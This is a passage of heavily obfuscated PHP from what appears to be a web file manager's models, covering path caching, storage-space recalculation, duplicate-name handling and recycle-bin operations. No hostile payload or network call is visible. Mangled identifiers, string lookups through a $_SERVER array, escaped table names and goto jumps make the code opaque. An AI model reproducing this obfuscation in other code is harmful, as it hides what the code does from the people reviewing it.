$this->sourceInfo($Ñº…ôÄ); if (!$æ¤Æ‹’) { return !1; } $æ¤Æ‹’ = $this->_listDataApplyItem($æ¤Æ‹’, $óŞ‘ò ); self::$cachePathInfo[$—¡Ùä•—] = $æ¤Æ‹’; return $æ¤Æ‹’; } public static $cachePathInfoMore = array(); public function pathInfoMore($ÙæšåÓÆ) { $ßÍôøÌÙ =& $_SERVER[”ôÑ§ì¸]; $õ¥œÑÂş = _get(self::$cachePathInfoMore, $ÙæšåÓÆ); if ($õ¥œÑÂş) { return $õ¥œÑÂş; } $®õö®Óø = $this->pathInfo($ÙæšåÓÆ); if (!$®õö®Óø) { return !1; } if ($®õö®Óø[$ßÍôøÌÙ[452]] == $ßÍôøÌÙ[88]) { $®õö®Óø[$ßÍôøÌÙ[79]] = $this->folderChildrenNumber($ÙæšåÓÆ); } self::$cachePathInfoMore[$ÙæšåÓÆ] = $®õö®Óø; return $®õö®Óø; } public function sourceInfo($ÜªºÄÜİ) { $Ãô„¤· =& $_SERVER[”ôÑ§ì¸]; if (!$ÜªºÄÜİ) { return array(); } $ÜªºÄÜİ = intval($ÜªºÄÜİ); $€«¸Á = $Ãô„¤·[500] . $ÜªºÄÜİ; $´ú²‡Ï = _get(self::$cacheSourceInfo, $€«¸Á); if ($´ú²‡Ï) { return $´ú²‡Ï; } $´Ñú Å = $this->where(array($Ãô„¤·[180] => $ÜªºÄÜİ))->find(); self::$cacheSourceInfo[$€«¸Á] = $´Ñú Å; return self::$cacheSourceInfo[$€«¸Á]; } public function sourceCacheClear($ˆ‘ºœÌº = false) { self::cacheClear($ˆ‘ºœÌº); } public static function cacheClear($‡æâåŸ¸ = false) { $É‡ı± =& $_SERVER[”ôÑ§ì¸]; if ($‡æâåŸ¸ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$É‡ı±[500] . $‡æâåŸ¸]); unset(self::$cachePathInfoMore[$‡æâåŸ¸]); unset(self::$cachePathInfo[$É‡ı±[2169] . $‡æâåŸ¸]); unset(self::$cachePathInfo[$É‡ı±[2170] . $‡æâåŸ¸]); } public function metaSet($şƒõğ“†, $Á™Èùò = null, $Ì¯¬ÌÒ = null) { $Ñ¼Û²µÇ = parent::metaSet($şƒõğ“†, $Á™Èùò, $Ì¯¬ÌÒ); if ($Ñ¼Û²µÇ) { $this->sourceCacheClear($şƒõğ“†); } return $Ñ¼Û²µÇ; } public function pathInfoByPath($ØõÑ¤ÅÉ, $Û«£’êµ) { $çíÓ¡Ëœ =& $_SERVER[”ôÑ§ì¸]; $‡›ÏÌøö = !$Û«£’êµ ? array() : explode($çíÓ¡Ëœ[8], trim($Û«£’êµ, $çíÓ¡Ëœ[8])); $Ÿ²²—¥Ù = $ØõÑ¤ÅÉ; foreach ($‡›ÏÌøö as $¶ºÉ´) { $‰ôõ¤Ã– = array($çíÓ¡Ëœ[179] => $Ÿ²²—¥Ù, $çíÓ¡Ëœ[32] => $¶ºÉ´); $ÈÔ‰â¤¦ = $this->field($çíÓ¡Ëœ[2171])->where($‰ôõ¤Ã–)->select(); if (!$ÈÔ‰â¤¦) { return !1; } $ÈÔ‰â¤¦ = array_sort_by($ÈÔ‰â¤¦, $çíÓ¡Ëœ[472]); $Ÿ²²—¥Ù = $ÈÔ‰â¤¦[0][$çíÓ¡Ëœ[180]]; } $ºÈ• š = $this->sourceInfo($Ÿ²²—¥Ù); $this->pathInfoFilter($ºÈ• š); return $ºÈ• š; } protected function updateModifyTime($¬¡·…‡œ) { $Ÿ­‘ÏŸî =& $_SERVER[”ôÑ§ì¸]; $¿ûÕ™¶  = defined($Ÿ­‘ÏŸî[2087]) ? USER_ID : 0; if (!$¬¡·…‡œ) { return; } if (!is_array($¬¡·…‡œ)) { $¬¡·…‡œ = array($¬¡·…‡œ); } foreach ($¬¡·…‡œ as $ÃÏä‰ÛÈ => $×ìß—â) { $¬¡·…‡œ[$ÃÏä‰ÛÈ] = intval($×ìß—â); $this->sourceCacheClear($×ìß—â); } $™º¸š© = array($Ÿ­‘ÏŸî[180] => array($Ÿ­‘ÏŸî[7], $¬¡·…‡œ)); $¿±§óÖ° = array($Ÿ­‘ÏŸî[618] => $¿ûÕ™¶ , $Ÿ­‘ÏŸî[465] => time()); $this->where($™º¸š©)->save($¿±§óÖ°); } public function folderSizeReset($šìÁ¥éª, $…ê›²ÆÒ = false) { $Ì²Òƒ =& $_SERVER[”ôÑ§ì¸]; if ($this->statusIgnoreResetSpace) { return; } $êòãÍíï = $this->sourceInfo($šìÁ¥éª); $ÌÒé±şÜ = $Ì²Òƒ[2172] . $šìÁ¥éª; CacheLock::lock($ÌÒé±şÜ, 20); if ($…ê›²ÆÒ === !1) { $this->sourceCacheClear($šìÁ¥éª); $êòãÍíï = $this->sourceInfo($šìÁ¥éª); $úšŸ¿á˜ = array($Ì²Òƒ[444] => $šìÁ¥éª, $Ì²Òƒ[471] => 0); $‘Ï­¸ÀÒ = $this->where($úšŸ¿á˜)->sum($Ì²Òƒ[76]); $…ê›²ÆÒ = intval($‘Ï­¸ÀÒ) - intval($êòãÍíï[$Ì²Òƒ[76]]); } if ($…ê›²ÆÒ == 0) { return CacheLock::unlock($ÌÒé±şÜ); } $Íğ«œ¸ = $this->parentLevelArray($êòãÍíï[$Ì²Òƒ[552]]); if (!$Íğ«œ¸) { $Íğ«œ¸ = array(); } $Íğ«œ¸[] = $êòãÍíï[$Ì²Òƒ[180]]; $úšŸ¿á˜ = array($Ì²Òƒ[180] => array($Ì²Òƒ[459], $Íğ«œ¸)); if ($…ê›²ÆÒ < 0) { $úšŸ¿á˜[$Ì²Òƒ[76]] = array($Ì²Òƒ[1046], abs($…ê›²ÆÒ)); } $this->where($úšŸ¿á˜)->setAdd($Ì²Òƒ[76], $…ê›²ÆÒ); CacheLock::unlock($ÌÒé±şÜ); $«ËßôÃˆ = $Ì²Òƒ[2173] . $êòãÍíï[$Ì²Òƒ[177]] . $Ì²Òƒ[4] . $êòãÍíï[$Ì²Òƒ[537]]; $®â¬ö‡ø = array($êòãÍíï[$Ì²Òƒ[177]], $êòãÍíï[$Ì²Òƒ[537]]); TaskRun::timeLimitCall($«ËßôÃˆ, $Ì²Òƒ[2174], $®â¬ö‡ø, 1.5); } public function folderSizeResetChildren($è‡È—) { $ÏæñõÎş =& $_SERVER[”ôÑ§ì¸]; $this->sourceCacheClear($è‡È—); $¬¹¾ª±Ë = $this->sourceInfo($è‡È—); $‘÷œğÔï = array($ÏæñõÎş[613] => 1, $ÏæñõÎş[616] => $¬¹¾ª±Ë[$ÏæñõÎş[537]], $ÏæñõÎş[619] => array($ÏæñõÎş[579], $¬¹¾ª±Ë[$ÏæñõÎş[552]] . $è‡È— . $ÏæñõÎş[580])); $á—Å¶ìÙ = $ÏæñõÎş[2175]; $ş·œòƒ = $this->field($á—Å¶ìÙ)->where($‘÷œğÔï)->select(); $‘÷œğÔï[$ÏæñõÎş[452]] = 0; $³—Û–€¡ = $this->field($á—Å¶ìÙ)->where($‘÷œğÔï)->select(); if (!$³—Û–€¡) { return; } $ş·œòƒ[] = $¬¹¾ª±Ë; $ş·œòƒ = array_to_keyvalue($ş·œòƒ, $ÏæñõÎş[180]); foreach ($ş·œòƒ as $¢Ï’©ºû => $¸Û‡Úî™) { $ş·œòƒ[$¢Ï’©ºû][$ÏæñõÎş[2176]] = $ş·œòƒ[$¢Ï’©ºû][$ÏæñõÎş[76]]; $ş·œòƒ[$¢Ï’©ºû][$ÏæñõÎş[76]] = 0; } foreach ($³—Û–€¡ as $¸Û‡Úî™) { $ÓÀ¾¼€ = $¸Û‡Úî™[$ÏæñõÎş[179]] . $ÏæñõÎş[12]; if (!isset($ş·œòƒ[$ÓÀ¾¼€])) { continue; } if ($¸Û‡Úî™[$ÏæñõÎş[472]] == $ş·œòƒ[$ÓÀ¾¼€][$ÏæñõÎş[472]]) { $ş·œòƒ[$ÓÀ¾¼€][$ÏæñõÎş[76]] += $¸Û‡Úî™[$ÏæñõÎş[76]]; } } foreach ($ş·œòƒ as $¸Û‡Úî™) { $ùæºô‘Ù = $this->parentLevelArray($¸Û‡Úî™[$ÏæñõÎş[552]]); foreach ($ùæºô‘Ù as $ÓÀ¾¼€) { $ÓÀ¾¼€ = $ÓÀ¾¼€ . $ÏæñõÎş[12]; if (!isset($ş·œòƒ[$ÓÀ¾¼€])) { continue; } if ($¸Û‡Úî™[$ÏæñõÎş[472]] == $ş·œòƒ[$ÓÀ¾¼€][$ÏæñõÎş[472]]) { $ş·œòƒ[$ÓÀ¾¼€][$ÏæñõÎş[76]] += $¸Û‡Úî™[$ÏæñõÎş[76]]; } } } $Ùì¼³Ää = array(); foreach ($ş·œòƒ as $¸Û‡Úî™) { if ($¸Û‡Úî™[$ÏæñõÎş[76]] == $¸Û‡Úî™[$ÏæñõÎş[2176]]) { continue; } $Ùì¼³Ää[] = array($ÏæñõÎş[180], $¸Û‡Úî™[$ÏæñõÎş[180]], $ÏæñõÎş[76], $¸Û‡Úî™[$ÏæñõÎş[76]]); } $this->saveAll($Ùì¼³Ää); } public function userSpaceReset($°©¤­èş = false) { $Èáµ¬™¶ =& $_SERVER[”ôÑ§ì¸]; $Éää÷á¹ = $this->where(array($Èáµ¬™¶[177] => self::TYPE_USER, $Èáµ¬™¶[537] => $°©¤­èş, $Èáµ¬™¶[452] => 0))->sum($Èáµ¬™¶[76]); $Éää÷á¹ = !$Éää÷á¹ || $Éää÷á¹ <= 0 ? 0 : $Éää÷á¹; Model($Èáµ¬™¶[545])->userEdit($°©¤­èş, array($Èáµ¬™¶[1855] => $Éää÷á¹)); } public function targetSpaceUpdate($”ÂÏ¬ù­, $ÄÁ«´¦á) { $É»æÃƒ =& $_SERVER[”ôÑ§ì¸]; if (!$ÄÁ«´¦á) { return; } if (!in_array($”ÂÏ¬ù­, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $åıûÉ¿í = $this->targetSpaceSize($”ÂÏ¬ù­, $ÄÁ«´¦á); if ($”ÂÏ¬ù­ == self::TYPE_USER) { Model($É»æÃƒ[545])->userEdit($ÄÁ«´¦á, array($É»æÃƒ[1855] => $åıûÉ¿í)); } else { if ($”ÂÏ¬ù­ == self::TYPE_GROUP) { Model($É»æÃƒ[553])->groupEdit($ÄÁ«´¦á, array($É»æÃƒ[1855] => $åıûÉ¿í)); } } } public function targetSpaceSize($†Ò³£â, $™†è¦Ú) { $¡™Óáê =& $_SERVER[”ôÑ§ì¸]; $ß‡İƒ˜ = 0; $Ûï»ƒ‡É = $this->targetSourceRoot($†Ò³£â, $™†è¦Ú, !0); foreach ($Ûï»ƒ‡É as $ıĞï®´) { if (!$ıĞï®´) { continue; } $ß‡İƒ˜ += floatval($ıĞï®´[$¡™Óáê[76]]); $ƒª‡®æØ = array($¡™Óáê[619] => array($¡™Óáê[579], $¡™Óáê[562] . $ıĞï®´[$¡™Óáê[180]] . $¡™Óáê[580])); $“™Í§‹ = Model($¡™Óáê[470])->field($¡™Óáê[458])->where($ƒª‡®æØ)->select(); $“™Í§‹ = array_to_keyvalue($“™Í§‹, $¡™Óáê[12], $¡™Óáê[180]); $“™Í§‹ = array_unique(array_filter($“™Í§‹)); if ($“™Í§‹) { $ƒª‡®æØ = array($¡™Óáê[458] => array($¡™Óáê[459], $“™Í§‹)); $ß‡İƒ˜ += floatval($this->where($ƒª‡®æØ)->sum($¡™Óáê[76])); } } $ß‡İƒ˜ = !$ß‡İƒ˜ || $ß‡İƒ˜ <= 0 ? 0 : $ß‡İƒ˜; return $ß‡İƒ˜; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ñ®ëı¶) { return $this->fileTypeProfile($ñ®ëı¶, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ÒÎİÙ¨õ) { return $this->fileTypeProfile($ÒÎİÙ¨õ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($‚²×„É¦, $Óˆğ×é) { $ö»ÀÇÇ˜ =& $_SERVER[”ôÑ§ì¸]; $àû‚òÌ° = $ö»ÀÇÇ˜[2177] . $‚²×„É¦ . $ö»ÀÇÇ˜[11] . $Óˆğ×é; $¦°²·¦ = Cache::get($àû‚òÌ°); if ($¦°²·¦) { return $¦°²·¦; } $·¿¯§É  = array($ö»ÀÇÇ˜[613] => 0); if ($‚²×„É¦ != !1) { $·¿¯§É [$ö»ÀÇÇ˜[537]] = $‚²×„É¦; $·¿¯§É [$ö»ÀÇÇ˜[177]] = $Óˆğ×é; } $ÚŒë¬ºƒ = array(); $ÚŒë¬ºƒ[$ö»ÀÇÇ˜[2178]] = array($ö»ÀÇÇ˜[2179] => LNG($ö»ÀÇÇ˜[2178]), $ö»ÀÇÇ˜[2180] => $this->where($·¿¯§É )->count(), $ö»ÀÇÇ˜[584] => $this->where($·¿¯§É )->sum($ö»ÀÇÇ˜[76])); $Úªíà = KodIO::fileTypeList(); foreach ($Úªíà as $ÙÂÏÈş¶ => $È²ˆÇ¯È) { $·¿¯§É [$ö»ÀÇÇ˜[453]] = $this->fileTypeWhere($ÙÂÏÈş¶); $ÚŒë¬ºƒ[$ÙÂÏÈş¶] = array($ö»ÀÇÇ˜[2179] => $È²ˆÇ¯È[$ö»ÀÇÇ˜[32]], $ö»ÀÇÇ˜[2180] => $this->where($·¿¯§É )->count(), $ö»ÀÇÇ˜[584] => $this->where($·¿¯§É )->sum($ö»ÀÇÇ˜[76])); } Cache::set($àû‚òÌ°, $ÚŒë¬ºƒ, 1200); return $ÚŒë¬ºƒ; } public function fileNameExist($Ê–ù¯òØ, $¹¦‘¿š‚) { $œßÅÜà =& $_SERVER[”ôÑ§ì¸]; $»ƒŠô¡ = $this->field($œßÅÜà[2181])->where(array($œßÅÜà[179] => $Ê–ù¯òØ, $œßÅÜà[32] => $¹¦‘¿š‚, $œßÅÜà[472] => 0))->find(); return is_array($»ƒŠô¡) ? $»ƒŠô¡[$œßÅÜà[180]] : !1; } public function childList($³Á›Æôé) { $±£º©£‘ =& $_SERVER[”ôÑ§ì¸]; $Œõ‚®Ùè = $±£º©£‘[2154] . $³Á›Æôé; if (isset(self::$cacheChildList[$Œõ‚®Ùè])) { return self::$cacheChildList[$Œõ‚®Ùè]; } $•óÆºèï = array($±£º©£‘[179] => intval($³Á›Æôé), $±£º©£‘[472] => 0); $Ğ¿æÄ²ƒ = $this->where($•óÆºèï)->select(); $Ğ¿æÄ²ƒ = $Ğ¿æÄ²ƒ ? $Ğ¿æÄ²ƒ : array(); self::$cacheChildList[$Œõ‚®Ùè] = $Ğ¿æÄ²ƒ; foreach ($Ğ¿æÄ²ƒ as $©Ø£…‡) { $Œõ‚®Ùè = $±£º©£‘[500] . $©Ø£…‡[$±£º©£‘[180]]; self::$cacheSourceInfo[$Œõ‚®Ùè] = $©Ø£…‡; } return $Ğ¿æÄ²ƒ; } public function fileNameAuto($¨Œû«üã, $ó¾à„ò, $‚§°¿Æ = REPEAT_RENAME, $ÇÍœäìÆ = false) { $°¥éèÊ€ =& $_SERVER[”ôÑ§ì¸]; $¡ÀèÌâ = get_path_ext($ó¾à„ò); $šƒŞ¥“ = $¡ÀèÌâ ? basename($ó¾à„ò, $°¥éèÊ€[10] . $¡ÀèÌâ) . $°¥éèÊ€[2182] . $¡ÀèÌâ : $ó¾à„ò . $°¥éèÊ€[427]; $ãêÅı = array($°¥éèÊ€[179] => $¨Œû«üã, $°¥éèÊ€[472] => 0, $°¥éèÊ€[32] => array($°¥éèÊ€[426], $šƒŞ¥“)); $ÎÁ“ğ = $this->field($°¥éèÊ€[32])->where($ãêÅı)->select(); $å‘Á‹” = array_to_keyvalue($ÎÁ“ğ, $°¥éèÊ€[12], $°¥éèÊ€[32]); return $this->fileNameAutoGet($å‘Á‹”, $ó¾à„ò, $‚§°¿Æ, $ÇÍœäìÆ); } public function fileNameAutoGet($Õ€Š«·, $‰ıœ Çé, $ˆâÃ»Í¼, $Ñ¡‹Ä§“) { $êÀ¢¹ÒÕ =& $_SERVER[”ôÑ§ì¸]; if ($ˆâÃ»Í¼ == REPEAT_REPLACE || !$Õ€Š«· || !in_array_not_case($‰ıœ Çé, $Õ€Š«·) || $Ñ¡‹Ä§“ && $ˆâÃ»Í¼ != REPEAT_RENAME_FOLDER) { return $‰ıœ Çé; } if ($ˆâÃ»Í¼ == REPEAT_SKIP) { return !1; } $Ö¥²àŒ¶ = $êÀ¢¹ÒÕ[10] . get_path_ext($‰ıœ Çé); $Ö¥²àŒ¶ = $Ö¥²àŒ¶ == $êÀ¢¹ÒÕ[10] || $Ñ¡‹Ä§“ ? $êÀ¢¹ÒÕ[12] : $Ö¥²àŒ¶; for ($¾±ÚÁ± = 1; $¾±ÚÁ± <= count($Õ€Š«·) + 1; $¾±ÚÁ±++) { $Ê„ÁĞÍ± = substr($‰ıœ Çé, 0, strlen($‰ıœ Çé) - strlen($Ö¥²àŒ¶)); $œ¸ÂÍğí = $Ê„ÁĞÍ± . "\50{$¾±ÚÁ±}\51{$Ö¥²àŒ¶}"; if (!in_array_not_case($œ¸ÂÍğí, $Õ€Š«·)) { return $œ¸ÂÍğí; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\165\162\143\x65\137\162\145\143\x79\143\x6c\x65"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\x54\x69\x6d\x65", "\164\x69\x6d\x65", "\151\156\x73\x65\x72\164", "\x66\x75\156\143\x74\151\157\x6e")); public function listData($ğ²úú˜¨ = false) { $‹“¿’ºË =& $_SERVER[”ôÑ§ì¸]; $ğ²úú˜¨ = $ğ²úú˜¨ ? $ğ²úú˜¨ : USER_ID; $£Ñ™«‡ï = $this->where(array($‹“¿’ºË[1665] => $ğ²úú˜¨))->select(); return array_to_keyvalue($£Ñ™«‡ï, $‹“¿’ºË[12], $‹“¿’ºË[180]); } public function moveToRecycle($ÜÄ©âØÅ) { $¹’ª›®º =& $_SERVER[”ôÑ§ì¸]; $¥Š™·‚ú = Model($¹’ª›®º[1363]); $†‡Ÿú°‡ = $¥Š™·‚ú->sourceInfo($ÜÄ©âØÅ); if (!$†‡Ÿú°‡ || $†‡Ÿú°‡[$¹’ª›®º[472]] == $¹’ª›®º[88]) { return; } $¯ĞŠ¤ó = array($¹’ª›®º[458] => $ÜÄ©âØÅ, $¹’ª›®º[1665] => USER_ID, $¹’ª›®º[615] => $†‡Ÿú°‡[$¹’ª›®º[177]], $¹’ª›®º[616] => $†‡Ÿú°‡[$¹’ª›®º[537]], $¹’ª›®º[619] => $†‡Ÿú°‡[$¹’ª›®º[552]]); $this->add($¯ĞŠ¤ó); $this->recycleMove($ÜÄ©âØÅ, 1); if ($†‡Ÿú°‡[$¹’ª›®º[452]] == $¹’ª›®º[88]) { $§£ƒ¶Æë = array($¹’ª›®º[619] => array($¹’ª›®º[579], $†‡Ÿú°‡[$¹’ª›®º[552]] . $ÜÄ©âØÅ . $¹’ª›®º[580])); $¥Š™·‚ú->where($§£ƒ¶Æë)->setField($¹’ª›®º[472], 1); } } public function clear() { $this->remove(!1); } public function remove($±Âùª¦± = false, $–½‚î‚Ø = false) { $Åúº÷Á• =& $_SERVER[”ôÑ§ì¸]; $–½‚î‚Ø = $–½‚î‚Ø ? $–½‚î‚Ø : USER_ID; $õ¢–ªçÚ = Model($Åúº÷Á•[1363]); $Úû¾Õ¢¡ = $this->listData($–½‚î‚Ø); $±Âùª¦± = $±Âùª¦± === !1 ? !1 : $±Âùª¦±; $†©°ã… = array(); foreach ($Úû¾Õ¢¡ as $“—ÛÆÃ–) { if ($±Âùª¦± != !1 && !in_array($“—ÛÆÃ–, $±Âùª¦±)) { continue; } $ĞÄ¦“ñ¡ = $õ¢–ªçÚ->sourceInfo($“—ÛÆÃ–); $õ¢–ªçÚ->remove($“—ÛÆÃ–, !1); $çĞ°º‚– = $ĞÄ¦“ñ¡[$Åúº÷Á•[177]] . $Åúº÷Á•[11] . $ĞÄ¦“ñ¡[$Åúº÷Á•[537]]; $†©°ã…[$çĞ°º‚–] = array($Åúº÷Á•[615] => $ĞÄ¦“ñ¡[$Åúº÷Á•[177]], $Åúº÷Á•[537] => $ĞÄ¦“ñ¡[$Åúº÷Á•[537]]); $this->where(array($Åúº÷Á•[180] => $“—ÛÆÃ–))->delete(); } foreach ($†©°ã… as $Ïùªô…È) { $õ¢–ªçÚ->targetSpaceUpdate($Ïùªô…È[$Åúº÷Á•[177]], $Ïùªô…È[$Åúº÷Á•[537]]); } } public function restore($£‡öÄ¶¢ = false) { $×ü“„”¯ = $this->listData(); $this->_restoreSource($×ü“„”¯, $£‡öÄ¶¢); } public function removeUserAll($èúÚœÑã) { $this->remove(!1, $èúÚœÑã); } private function _restoreSource($‰ğÆöĞ€, $‚Öå¶») { $Ö€ªÊˆ† =& $_SERVER[”ôÑ§ì¸]; $Ã åûá = Model($Ö€ªÊˆ†[1363]); $‚Öå¶» = $‚Öå¶» == !1 ? !1 : $‚Öå¶»; if (!$‰ğÆöĞ€) { return !0; } $å°İàìÙ = array(); foreach ($‰ğÆöĞ€ as $¬âË´ÇÛ) { if ($‚Öå¶» != !1 && !in_array($¬âË´ÇÛ, $‚Öå¶»)) { continue; } $Âƒ‘àÖÏ = $Ã åûá->sourceInfo($¬âË´ÇÛ); $äÜ±ãü¹ = $Ã åûá->sourceInfo($Âƒ‘àÖÏ[$Ö€ªÊˆ†[179]]); if ($äÜ±ãü¹[$Ö€ªÊˆ†[472]] == $Ö€ªÊˆ†[88]) { continue; } $Ã åûá->lockMoveStart($¬âË´ÇÛ); $this->recycleMove($¬âË´ÇÛ, 0); if ($Âƒ‘àÖÏ[$Ö€ªÊˆ†[452]] == $Ö€ªÊˆ†[88]) { $¡ÁËŞÈ = array($Ö€ªÊˆ†[619] => array($Ö€ªÊˆ†[579], $Âƒ‘àÖÏ[$Ö€ªÊˆ†[552]] . $¬âË´ÇÛ . $Ö€ªÊˆ†[580])); $Ã åûá->where($¡ÁËŞÈ)->setField($Ö€ªÊˆ†[472], 0); $this->restoreFolderChildren($¬âË´ÇÛ, $‰ğÆöĞ€); } $this->where(array($Ö€ªÊˆ†[180] => $¬âË´ÇÛ))->delete(); $Ã åûá->folderSizeReset($Âƒ‘àÖÏ[$Ö€ªÊˆ†[179]]); $å°İàìÙ[] = $Âƒ‘àÖÏ[$Ö€ªÊˆ†[179]]; if ($Âƒ‘àÖÏ[$Ö€ªÊˆ†[452]] == $Ö€ªÊˆ†[88]) { $å°İàìÙ[] = $¬âË´ÇÛ; } $Ã åûá->lockMoveEnd($¬âË´ÇÛ); } $Ã åûá->updateModifyTime($å°İàìÙ); } private function restoreFolderChildren($Ñå¹€Ñ°, $è’ñ¼å¾) { $¢Ô¾Ÿã÷ =& $_SERVER[”ôÑ§ì¸]; $áìÖŸË¡ = Model($¢Ô¾Ÿã÷[1363]); $ß¹µšì = array($¢Ô¾Ÿã÷[180] => array($¢Ô¾Ÿã÷[7], array())); foreach ($è’ñ¼å¾ as $üû’ÓùŠ) { if ($üû’ÓùŠ == $Ñå¹€Ñ°) { continue; } if (!$áìÖŸË¡->isParentOf($Ñå¹€Ñ°, $üû’ÓùŠ)) { continue; } $’Á‰Ãã = $áìÖŸË¡->sourceInfo($üû’ÓùŠ); if ($’Á‰Ãã[$¢Ô¾Ÿã÷[452]] == $¢Ô¾Ÿã÷[88]) { $ß¹µšì[] = array($¢Ô¾Ÿã÷[619] => array($¢Ô¾Ÿã÷[579], $’Á‰Ãã[$¢Ô¾Ÿã÷[552]] . $üû’ÓùŠ . $¢Ô¾Ÿã÷[580])); } else { $ß¹µšì[$¢Ô¾Ÿã÷[180]][1][] = $üû’ÓùŠ; } } if (!$ß¹µšì[$¢Ô¾Ÿã÷[180]][1]) { unset($ß¹µšì[$¢Ô¾Ÿã÷[180]]); } if (!$ß¹µšì) { return; } if (is_array($ß¹µšì[$¢Ô¾Ÿã÷[180]]) && is_array($ß¹µšì[$¢Ô¾Ÿã÷[180]][1])) { $ß¹µšì[$¢Ô¾Ÿã÷[180]][1] = array_unique($ß¹µšì[$¢Ô¾Ÿã÷[180]][1]); } $ß¹µšì[$¢Ô¾Ÿã÷[1031]] = $¢Ô¾Ÿã÷[1964]; $áìÖŸË¡->where($ß¹µšì)->setField($¢Ô¾Ÿã÷[472], 1); } private function recycleMove($úİÕğÆ¼, $’øÎ°‘ = 1) { $ıË«Ş¦› =& $_SERVER[”ôÑ§ì¸]; $¶½…§¹§ = Model($ıË«Ş¦›[1363]); $ğıÊ·ŸÕ = Model($ıË«Ş¦›[2183]); $‘àŒ£‘¬ = array($ıË«Ş¦›[180] => $úİÕğÆ¼); if ($’øÎ°‘) { $¶½…§¹§->where($‘àŒ£‘¬)->setField($ıË«Ş¦›[472], 1); $ğıÊ·ŸÕ->eventRecycle($úİÕğÆ¼, $ıË«Ş¦›[2184]); } else { $³²Äıû = $¶½…§¹§->where($‘àŒ£‘¬)->find(); $¦Ú—ûÆ = $³²Äıû[$ıË«Ş¦›[452]] == $ıË«Ş¦›[88]; $¦¦Š™Ô‚ = $¶½…§¹§->fileNameAuto($³²Äıû[$ıË«Ş¦›[179]], $³²Äıû[$ıË«Ş¦›[32]], REPEAT_RENAME_FOLDER, $¦Ú—ûÆ); if ($¦¦Š™Ô‚ != $³²Äıû[$ıË«Ş¦›[32]]) { $¶½…§¹§->rename($úİÕğÆ¼, $¦¦Š™Ô‚); } $¶½…§¹§->where($‘àŒ£‘¬)->setField($ıË«Ş¦›[472], 0); $ğıÊ·ŸÕ->eventRecycle($úİÕğÆ¼, $ıË«Ş¦›[2185]); } } } goto CèŸŒøò„; b”ö‚­ß¹Î: class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\164\x65\x6d\x5f\154\157\x67"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\124\x69\155\x65", "\x74\x69\155\x65", "\x69\x6e\163\145\x72\x74", "\146\165\x6e\143\164\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ı¼ø†ƒ­ =& $_SERVER[”ôÑ§ì¸]; return array($ı¼ø†ƒ­[2202] => LNG($ı¼ø†ƒ­[2203]), $ı¼ø†ƒ­[2204] => LNG($ı¼ø†ƒ­[2205]), $ı¼ø†ƒ­[1809] => LNG($ı¼ø†ƒ­[2206]), $ı¼ø†ƒ­[2207] => LNG($ı¼ø†ƒ­[2208]), $ı¼ø†ƒ­[2209] => LNG($ı¼ø†ƒ­[2210]), $ı¼ø†ƒ­[2211] => LNG($ı¼ø†ƒ­[2212]), $ı¼ø†ƒ­[2213] => LNG($ı¼ø†ƒ­[2214]), $ı¼ø†ƒ­[1839] => LNG($ı¼ø†ƒ­[2214]), $ı¼ø†ƒ­[1840] => LNG($ı¼ø†ƒ­[2215]), $ı¼ø†ƒ­[2216] => LNG($ı¼ø†ƒ­[2217]), $ı¼ø†ƒ­[2218] => LNG($ı¼ø†ƒ­[2219]), $ı¼ø†ƒ­[2220] => LNG($ı¼ø†ƒ­[2221]), $ı¼ø†ƒ­[2222] => LNG($ı¼ø†ƒ­[2223]), $ı¼ø†ƒ­[1837] => LNG($ı¼ø†ƒ­[2224]), $ı¼ø†ƒ­[2225] => LNG($ı¼ø†ƒ­[2226]), $ı¼ø†ƒ­[1844] => LNG($ı¼ø†ƒ­[2227]), $ı¼ø†ƒ­[2228] => LNG($ı¼ø†ƒ­[2229]), $ı¼ø†ƒ­[2230] => LNG($ı¼ø†ƒ­[2231]), $ı¼ø†ƒ­[2232] => LNG($ı¼ø†ƒ­[2233]), $ı¼ø†ƒ­[2234] => LNG($ı¼ø†ƒ­[2235]), $ı¼ø†ƒ­[1847] => LNG($ı¼ø†ƒ­[2236]), $ı¼ø†ƒ­[1848] => LNG($ı¼ø†ƒ­[2237]), $ı¼ø†ƒ­[2238] => LNG($ı¼ø†ƒ­[2239]), $ı¼ø†ƒ­[2240] => LNG($ı¼ø†ƒ­[2241]), $ı¼ø†ƒ­[2242] => LNG($ı¼ø†ƒ­[2243]), $ı¼ø†ƒ­[1842] => LNG($ı¼ø†ƒ­[2244]), $ı¼ø†ƒ­[2245] => LNG($ı¼ø†ƒ­[2246]), $ı¼ø†ƒ­[1841] => LNG($ı¼ø†ƒ­[2247]), $ı¼ø†ƒ­[2248] => LNG($ı¼ø†ƒ­[2249]), $ı¼ø†ƒ­[2250] => LNG($ı¼ø†ƒ­[2251]), $ı¼ø†ƒ­[2252] => LNG($ı¼ø†ƒ­[2253]), $ı¼ø†ƒ­[2254] => LNG($ı¼ø†ƒ­[2254]), $ı¼ø†ƒ­[2255] => LNG($ı¼ø†ƒ­[1813]), $ı¼ø†ƒ­[2256] => LNG($ı¼ø†ƒ­[2257]), $ı¼ø†ƒ­[2258] => LNG($ı¼ø†ƒ­[2259]), $ı¼ø†ƒ­[2260] => LNG($ı¼ø†ƒ­[2261]), $ı¼ø†ƒ­[2262] => LNG($ı¼ø†ƒ­[2263]), $ı¼ø†ƒ­[2264] => LNG($ı¼ø†ƒ­[2265]), $ı¼ø†ƒ­[2266] => LNG($ı¼ø†ƒ­[2266]), $ı¼ø†ƒ­[2267] => LNG($ı¼ø†ƒ­[2268]), $ı¼ø†ƒ­[2269] => LNG($ı¼ø†ƒ­[2270]), $ı¼ø†ƒ­[2271] => LNG($ı¼ø†ƒ­[2272]), $ı¼ø†ƒ­[2273] => LNG($ı¼ø†ƒ­[2274]), $ı¼ø†ƒ­[2275] => LNG($ı¼ø†ƒ­[2276]), $ı¼ø†ƒ­[2277] => LNG($ı¼ø†ƒ­[2278])); } private function 